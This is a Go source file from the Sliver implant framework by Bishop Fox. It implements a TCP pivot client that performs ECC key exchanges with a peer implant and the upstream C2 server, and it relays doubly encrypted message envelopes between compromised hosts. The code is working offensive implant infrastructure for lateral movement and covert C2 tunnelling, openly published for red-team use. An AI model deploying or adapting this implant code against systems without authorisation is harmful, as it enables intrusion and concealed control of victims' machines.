package pivotclients

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bytes"
	"encoding/base64"
	"encoding/binary"
	"errors"
	"net"
	"sync"
	"time"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/bishopfox/sliver/implant/sliver/cryptography"
	"github.com/bishopfox/sliver/implant/sliver/pivots"
	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/gofrs/uuid"
	"google.golang.org/protobuf/proto"
)

// NetConnPivotClient - A TCP pivot client
type NetConnPivotClient struct {
	originID        int64
	pivotSessionID  []byte
	conn            net.Conn
	readMutex       *sync.Mutex
	writeMutex      *sync.Mutex
	peerCipherCtx   *cryptography.CipherContext
	serverCipherCtx *cryptography.CipherContext

	readDeadline  time.Duration
	writeDeadline time.Duration
}

// KeyExchange - Perform the key exchange with peer and then the upstream server
func (p *NetConnPivotClient) KeyExchange() error {
	err := p.peerKeyExchange()
	if err != nil {
		return err
	}
	// {{if .Config.Debug}}
	log.Printf("[pivot] Peer key exchange successful")
	// {{end}}
	err = p.serverKeyExchange()
	if err != nil {
		return err
	}
	// {{if .Config.Debug}}
	log.Printf("[pivot] Server key exchange successful")
	// {{end}}
	return nil
}

func (p *NetConnPivotClient) peerKeyExchange() error {
	publicKey, err := base64.RawStdEncoding.DecodeString(cryptography.ECCPublicKey)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[pivot] Error decoding public key: %v", err)
		// {{end}}
		return err
	}
	pivotHello, _ := proto.Marshal(&pb.PivotHello{
		PublicKey:          publicKey,
		PeerID:             pivots.PeerID,
		PublicKeySignature: cryptography.ECCPublicKeySignature,
	})

	// Enforce deadlines on the key exchange
	p.conn.SetWriteDeadline(time.Now().Add(p.writeDeadline))
	p.write(pivotHello)
	p.conn.SetWriteDeadline(time.Time{})

	p.conn.SetReadDeadline(time.Now().Add(p.readDeadline))
	peerPublicKeyRaw, err := p.read()
	p.conn.SetReadDeadline(time.Time{})
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[pivot] Error reading peer public key: %v", err)
		// {{end}}
		return err
	}
	peerHello := &pb.PivotHello{}
	err = proto.Unmarshal(peerPublicKeyRaw, peerHello)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[pivot] Error un-marshaling peer public key: %v", err)
		// {{end}}
		return err
	}
	peerSessionKey, err := cryptography.ECCDecryptFromPeer(peerHello.PublicKey, peerHello.PublicKeySignature, peerHello.SessionKey)
	if err != nil || len(peerSessionKey) != 32 {
		// {{if .Config.Debug}}
		log.Printf("[pivot] Error decrypting session key: %v", err)
		// {{end}}
		return err
	}
	peerSessionKeyBuf := [32]byte{}
	copy(peerSessionKeyBuf[:], peerSessionKey)
	p.peerCipherCtx = cryptography.NewCipherContext(peerSessionKeyBuf)
	return nil
}

func (p *NetConnPivotClient) serverKeyExchange() error {
	p.originID = pivots.PeerID
	serverSessionKey := cryptography.RandomKey()
	p.serverCipherCtx = cryptography.NewCipherContext(serverSessionKey)
	ciphertext, err := cryptography.ECCEncryptToServer(serverSessionKey[:])
	if err != nil {
		return err
	}
	pivotServerKeyExchange, _ := proto.Marshal(&pb.PivotServerKeyExchange{
		OriginID:   p.originID,
		SessionKey: ciphertext,
	})
	pivotServerKeyExchangeEnvelope, _ := proto.Marshal(&pb.Envelope{
		Type: pb.MsgPivotServerKeyExchange,
		Data: pivotServerKeyExchange,
	})
	keyExchangeCiphertext, err := p.peerCipherCtx.Encrypt(pivotServerKeyExchangeEnvelope)
	if err != nil {
		return err
	}
	// {{if .Config.Debug}}
	log.Printf("[pivot] Sending server key exchange ...")
	// {{end}}
	p.conn.SetWriteDeadline(time.Now().Add(p.writeDeadline))
	err = p.write(keyExchangeCiphertext)
	p.conn.SetWriteDeadline(time.Time{})
	if err != nil {
		return err
	}

	// {{if .Config.Debug}}
	log.Printf("[pivot] Waiting for server key exchange response (5m) ...")
	// {{end}}
	// Now that both peer/server cipher contexts are setup we can use ReadEnvelope() we use
	// a different read deadline here as this has to go round trip to the server if the
	// upstream implant uses a slow protocol it may take a while to go there and back again
	p.conn.SetReadDeadline(time.Now().Add(5 * time.Minute))
	serverKeyExchangeResp, err := p.ReadEnvelope()
	p.conn.SetReadDeadline(time.Time{})
	if err != nil {
		return err
	}
	if serverKeyExchangeResp.Type != pb.MsgPivotServerKeyExchange {
		// {{if .Config.Debug}}
		log.Printf("[pivot] Unexpected message type: %v", serverKeyExchangeResp.Type)
		// {{end}}
		return errors.New("server key exchange failure")
	}
	// Just make sure we can parse the bytes
	p.pivotSessionID = uuid.FromBytesOrNil(serverKeyExchangeResp.Data).Bytes()

	// {{if .Config.Debug}}
	log.Printf("[pivot] Pivot session ID: %s",
		uuid.FromBytesOrNil(serverKeyExchangeResp.Data).String(),
	)
	// {{end}}

	return nil
}

// write - Write a message to the TCP pivot with a length prefix
// it's unlikely we can't write the 4-byte length prefix in one write
// so we fail if we can't, messages may be much longer so we try to
// drain the message buffer if we didn't complete the write
func (p *NetConnPivotClient) write(message []byte) error {
	p.writeMutex.Lock()
	defer p.writeMutex.Unlock()
	n, err := p.conn.Write(p.lengthOf(message))
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[pivot] Error writing message length: %v", err)
		// {{end}}
		return err
	}
	if n != 4 {
		// {{if .Config.Debug}}
		log.Printf("[pivot] Error writing message length: %v", err)
		// {{end}}
		return ErrFailedWrite
	}

	total := 0
	for total < len(message) {
		n, err = p.conn.Write(message[total:])
		total += n
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("[pivot] Error writing message: %v", err)
			// {{end}}
			return err
		}
	}
	return nil
}

func (p *NetConnPivotClient) read() ([]byte, error) {
	p.readMutex.Lock()
	defer p.readMutex.Unlock()
	dataLengthBuf := make([]byte, 4)
	n, err := p.conn.Read(dataLengthBuf)
	if err != nil || n != 4 {
		// {{if .Config.Debug}}
		log.Printf("[pivot] Error (read msg-length): %v\n", err)
		// {{end}}
		return nil, err
	}

	dataLength := int(binary.LittleEndian.Uint32(dataLengthBuf))
	readBuf := make([]byte, bufSize)
	dataBuf := []byte{}
	totalRead := 0
	for {
		n, err := p.conn.Read(readBuf)
		dataBuf = append(dataBuf, readBuf[:n]...)
		totalRead += n
		if totalRead == dataLength {
			break
		}
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("read error: %s\n", err)
			// {{end}}
			break
		}
	}
	return dataBuf, err
}

func (p *NetConnPivotClient) lengthOf(message []byte) []byte {
	dataLengthBuf := new(bytes.Buffer)
	binary.Write(dataLengthBuf, binary.LittleEndian, uint32(len(message)))
	return dataLengthBuf.Bytes()
}

// WriteEnvelope - Write a complete envelope
func (p *NetConnPivotClient) WriteEnvelope(envelope *pb.Envelope) error {
	plaintext, err := proto.Marshal(envelope)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[pivot] Marshaling error: %s", err)
		// {{end}}
		return err
	}
	var peerPlaintext []byte

	// Do not wrap pivot messages since we're not the origin
	if envelope.Type != pb.MsgPivotPeerPing && envelope.Type != pb.MsgPivotPeerEnvelope {
		// Prepend the message with the pivot session ID
		// note this can only be done after the server key change
		ciphertext, err := p.serverCipherCtx.Encrypt(plaintext)
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("[pivot] Server encryption error: %s", err)
			// {{end}}
			return err
		}
		msgBuf := make([]byte, len(p.pivotSessionID)+len(ciphertext))
		copy(msgBuf, p.pivotSessionID)
		copy(msgBuf[len(p.pivotSessionID):], ciphertext)
		peerPlaintext, _ = proto.Marshal(&pb.Envelope{
			Type: pb.MsgPivotOriginEnvelope,
			Data: msgBuf,
		})
	} else {
		// Pivot pings are not encrypted with the sever key
		peerPlaintext = plaintext
	}

	peerCiphertext, err := p.peerCipherCtx.Encrypt(peerPlaintext)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[pivot] Peer encryption error: %s", err)
		// {{end}}
		return err
	}
	return p.write(peerCiphertext)
}

// ReadEnvelope - Read a complete envelope
func (p *NetConnPivotClient) ReadEnvelope() (*pb.Envelope, error) {
	data, err := p.read()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[pivot] Error reading message: %v", err)
		// {{end}}
		return nil, err
	}
	data, err = p.peerCipherCtx.Decrypt(data)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[pivot] Peer decryption error: %s", err)
		// {{end}}
		return nil, err
	}
	incomingEnvelope := &pb.Envelope{}
	err = proto.Unmarshal(data, incomingEnvelope)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[pivot] Error unmarshal origin envelope: %v", err)
		// {{end}}
		return nil, err
	}

	// {{if .Config.Debug}}
	log.Printf("[pivot] Received incoming envelope: %+v", incomingEnvelope)
	// {{end}}

	// The only msg type that isn't encrypted by the server should be pivot pings
	if incomingEnvelope.Type == pb.MsgPivotPeerPing {
		return incomingEnvelope, nil
	}
	if incomingEnvelope.Type == pb.MsgPivotPeerEnvelope {
		return incomingEnvelope, nil
	}
	if incomingEnvelope.Type != pb.MsgPivotOriginEnvelope {
		// {{if .Config.Debug}}
		log.Printf("[pivot] Error unexpected envelope type (non-origin)")
		// {{end}}
		return nil, err
	}
	plaintext, err := p.serverCipherCtx.Decrypt(incomingEnvelope.Data)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[pivot] Server decryption error: %s", err)
		// {{end}}
		return nil, err
	}
	envelope := &pb.Envelope{}
	err = proto.Unmarshal(plaintext, envelope)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[pivot] Error unmarshal envelope: %v", err)
		// {{end}}
		return nil, err
	}
	return envelope, nil
}

// CloseSession - Close the TCP pivot session
func (p *NetConnPivotClient) CloseSession() error {
	return p.conn.Close()
}
